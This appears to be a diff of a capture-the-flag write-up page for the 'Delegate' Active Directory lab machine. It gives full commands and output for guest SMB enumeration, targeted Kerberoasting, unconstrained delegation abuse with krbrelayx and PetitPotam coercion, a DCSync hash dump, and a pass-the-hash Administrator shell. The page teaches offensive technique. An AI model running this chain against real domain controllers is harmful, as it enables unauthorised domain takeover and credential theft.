@@ -558,7 +558,7 @@
 
 
 <p><img alt="Delegate" src="../img/Delegate_BANNER.png" /></p>
-<h1 id="delegate-writeup">Delegate-WriteUp<a class="headerlink" href="#delegate-writeup" title="Permanent link">&para;</a></h1>
+<h1 id="delegate-writeup">Delegate-WriteUp</h1>
 <p>In this Windows Active Directory machine rated <strong>Medium</strong>, we'll compromise a Domain Controller by chaining several misconfigurations starting from unauthenticated SMB access. The key insight is that a logon script stored in SYSVOL leaks credentials in plaintext, and the compromised user has <code>SeEnableDelegationPrivilege</code>, which allows us to configure Unconstrained Delegation on a machine account we create. Ultimately capturing a TGT from the DC itself. You will learn how to:</p>
 <ul>
 <li>Enumerate SMB shares anonymously and read SYSVOL logon scripts</li>
@@ -573,7 +573,7 @@
 <p>🧰 Tools used: <code>nmap</code>, <code>nxc</code>, <code>smbclient</code>, <code>targetedKerberoast.py</code>, <code>hashcat</code>, <code>evil-winrm</code>, <code>addcomputer.py</code>, <code>bloodyAD</code>, <code>addspn.py</code>, <code>dnstool.py</code>, <code>krbrelayx.py</code>, <code>PetitPotam.py</code>, <code>secretsdump.py</code>.</p>
 <p>Let's get started.</p>
 <hr />
-<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
+<h2 id="port-scanning">Port Scanning</h2>
 <p>We started with a full TCP SYN scan across all ports on the target.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span><span class="m">10</span>.129.234.69
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
@@ -607,7 +607,7 @@
 <a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="m">60899</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
 </code></pre></div>
 <p>Classic Domain Controller port profile. All expected AD services are present, plus WinRM on 5985 which will be useful later.</p>
-<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="service-enumeration">Service Enumeration</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49673,50078,51525,60893,60899<span class="w"> </span><span class="m">10</span>.129.234.69<span class="w"> </span>-Pn
 <a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
 <a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
@@ -669,7 +669,7 @@
 <p>Domain is <code>delegate.vl</code>, DC hostname is <code>DC1</code>. Windows Server 2022 (build 20348). SMB signing is required, which rules out NTLM relay attacks over SMB.
 I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/hosts</code></p>
 <hr />
-<h2 id="smb-enumeration">SMB Enumeration<a class="headerlink" href="#smb-enumeration" title="Permanent link">&para;</a></h2>
+<h2 id="smb-enumeration">SMB Enumeration</h2>
 <p>We check whether null/guest authentication is allowed on SMB shares.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.234.69<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Guest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 <a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
@@ -680,7 +680,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>SMB<span class="w">  </span><span class="m">10</span>.129.234.69<span class="w">  </span><span class="m">445</span><span class="w">  </span>DC1<span class="w">  </span>SYSVOL<span class="w">      </span>READ
 </code></pre></div>
 <p>Guest authentication works and we have read access to <code>SYSVOL</code> and <code>NETLOGON</code>. These are default shares on every DC, but they can contain Group Policy files and logon scripts — a common source of sensitive information.</p>
-<h3 id="sysvol-enumeration">SYSVOL Enumeration<a class="headerlink" href="#sysvol-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="sysvol-enumeration">SYSVOL Enumeration</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>//10.129.234.69/SYSVOL<span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
 <a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>&lt;SNIP&gt;
@@ -736,7 +736,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 </code></pre></div>
 <p>Valid credentials for <code>A.Briggs</code>.</p>
 <hr />
-<h2 id="targeted-kerberoasting-nthompson">Targeted Kerberoasting — N.Thompson<a class="headerlink" href="#targeted-kerberoasting-nthompson" title="Permanent link">&para;</a></h2>
+<h2 id="targeted-kerberoasting-nthompson">Targeted Kerberoasting — N.Thompson</h2>
 <p>With BloodHound we confirm that <code>A.Briggs</code> has <strong>GenericWrite</strong> over <code>N.Thompson</code>. This allows us to set an SPN on <code>N.Thompson</code> and request a TGS ticket for it — a technique known as Targeted Kerberoasting.</p>
 <p><img alt="BloodHound showing A.Briggs has GenericWrite over N.Thompson" src="../img/Delegate_0001.png" /></p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>python3<span class="w"> </span>targetedKerberoast.py<span class="w"> </span>-d<span class="w"> </span>delegate.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'A.Briggs'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span>
@@ -752,7 +752,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nv">$krb5tgs$23$*</span>N.Thompson$&lt;REDACTED_HASH&gt;:&lt;REDACTED&gt;
 </code></pre></div>
 <hr />
-<h2 id="shell-as-nthompson-and-user-flag">Shell as N.Thompson and User Flag<a class="headerlink" href="#shell-as-nthompson-and-user-flag" title="Permanent link">&para;</a></h2>
+<h2 id="shell-as-nthompson-and-user-flag">Shell as N.Thompson and User Flag</h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.129.234.69<span class="w"> </span>-u<span class="w"> </span><span class="s1">'N.Thompson'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span>
 <a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.234.69<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC1<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span><span class="o">(</span>name:DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:delegate.vl<span class="o">)</span>
 <a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.234.69<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC1<span class="w">              </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>delegate.vl<span class="se">\N</span>.Thompson:&lt;REDACTED&gt;<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
@@ -768,7 +768,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">N</span><span class="p">.</span><span class="n">Thompson</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">type </span><span class="p">..\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span>
 <a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">&lt;</span><span class="n">USER_FLAG</span><span class="p">&gt;</span>
 </code></pre></div>
-<h3 id="privilege-enumeration">Privilege Enumeration<a class="headerlink" href="#privilege-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="privilege-enumeration">Privilege Enumeration</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">N</span><span class="p">.</span><span class="n">Thompson</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
 <a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
 <a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">USER</span> <span class="n">INFORMATION</span>
@@ -821,8 +821,8 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 </ul>
 <p>With these two together the attack path is clear: create a machine account, enable Unconstrained Delegation on it, force the DC to authenticate to it, and capture its TGT.</p>
 <hr />
-<h2 id="privilege-escalation-unconstrained-delegation-petitpotam">Privilege Escalation — Unconstrained Delegation + PetitPotam<a class="headerlink" href="#privilege-escalation-unconstrained-delegation-petitpotam" title="Permanent link">&para;</a></h2>
-<h3 id="step-1-create-a-machine-account-and-enable-unconstrained-delegation">Step 1 — Create a machine account and enable Unconstrained Delegation<a class="headerlink" href="#step-1-create-a-machine-account-and-enable-unconstrained-delegation" title="Permanent link">&para;</a></h3>
+<h2 id="privilege-escalation-unconstrained-delegation-petitpotam">Privilege Escalation — Unconstrained Delegation + PetitPotam</h2>
+<h3 id="step-1-create-a-machine-account-and-enable-unconstrained-delegation">Step 1 — Create a machine account and enable Unconstrained Delegation</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>addcomputer.py<span class="w"> </span>delegate.vl/N.Thompson:<span class="s1">'&lt;REDACTED&gt;'</span><span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'EVILPC$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'EvilPass123!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.234.69
 <a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
 <a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
@@ -837,7 +837,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>distinguishedName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>EVILPC,CN<span class="o">=</span>Computers,DC<span class="o">=</span>delegate,DC<span class="o">=</span>vl
 <a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>userAccountControl:<span class="w"> </span>WORKSTATION_TRUST_ACCOUNT<span class="p">;</span><span class="w"> </span>TRUSTED_FOR_DELEGATION
 </code></pre></div>
-<h3 id="step-2-add-spns-and-a-dns-record-for-evilpc">Step 2 — Add SPNs and a DNS record for EVILPC<a class="headerlink" href="#step-2-add-spns-and-a-dns-record-for-evilpc" title="Permanent link">&para;</a></h3>
+<h3 id="step-2-add-spns-and-a-dns-record-for-evilpc">Step 2 — Add SPNs and a DNS record for EVILPC</h3>
 <p>For <code>krbrelayx</code> to decrypt the incoming Kerberos tickets, the DC must authenticate using Kerberos (not NTLM). This only happens if it can resolve <code>EVILPC.delegate.vl</code> to our IP and find a matching SPN.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python3<span class="w"> </span>addspn.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">'delegate.vl\N.Thompson'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">'HOST/EVILPC.delegate.vl'</span><span class="w"> </span>-t<span class="w"> </span><span class="s1">'EVILPC$'</span><span class="w"> </span>--additional<span class="w"> </span>ldap://10.129.234.69
 <a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>host...
@@ -860,7 +860,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>modification<span class="w"> </span>target
 <a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>SPN<span class="w"> </span>Modified<span class="w"> </span>successfully
 </code></pre></div>
-<h3 id="step-3-capture-the-tgt-with-krbrelayx-petitpotam">Step 3 — Capture the TGT with krbrelayx + PetitPotam<a class="headerlink" href="#step-3-capture-the-tgt-with-krbrelayx-petitpotam" title="Permanent link">&para;</a></h3>
+<h3 id="step-3-capture-the-tgt-with-krbrelayx-petitpotam">Step 3 — Capture the TGT with krbrelayx + PetitPotam</h3>
 <p><strong>Terminal 1</strong> — Start <code>krbrelayx</code> in Unconstrained Delegation mode. The <code>--krbsalt</code> and <code>--krbpass</code> values are used to decrypt incoming tickets encrypted with <code>EVILPC$</code>'s key:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>krbrelayx.py<span class="w"> </span>--krbsalt<span class="w"> </span><span class="s1">'DELEGATE.VLEVILPC$'</span><span class="w"> </span>--krbpass<span class="w"> </span><span class="s1">'EvilPass123!'</span><span class="w"> </span><span class="se">\</span>
 <a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span>--interface-ip<span class="w"> </span>&lt;ATTACKER_IP&gt;
@@ -921,7 +921,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 <a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>DC1<span class="nv">$@</span>DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
 </code></pre></div>
 <p>The DC authenticated to our fake server using Kerberos. Because <code>EVILPC$</code> has Unconstrained Delegation enabled, the DC's TGT was embedded in the service ticket and <code>krbrelayx</code> extracted and saved it to disk.</p>
-<h3 id="step-4-dcsync-with-dc1s-tgt">Step 4 — DCSync with DC1$'s TGT<a class="headerlink" href="#step-4-dcsync-with-dc1s-tgt" title="Permanent link">&para;</a></h3>
+<h3 id="step-4-dcsync-with-dc1s-tgt">Step 4 — DCSync with DC1$'s TGT</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'</span>
 <a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>DC1.delegate.vl<span class="w"> </span>-just-dc-ntlm
 <a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
@@ -935,7 +935,7 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
 </code></pre></div>
 <p>All domain hashes dumped.</p>
 <hr />
-<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag<a class="headerlink" href="#shell-as-administrator-root-flag" title="Permanent link">&para;</a></h2>
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag</h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.234.69<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;REDACTED_HASH&gt;
 <a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
 <a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>root.txt
@@ -1022,6 +1022,8 @@ I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/ho
     
     
       <script src="../../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../../../javascripts/site.js"></script>
       
     
   </body>
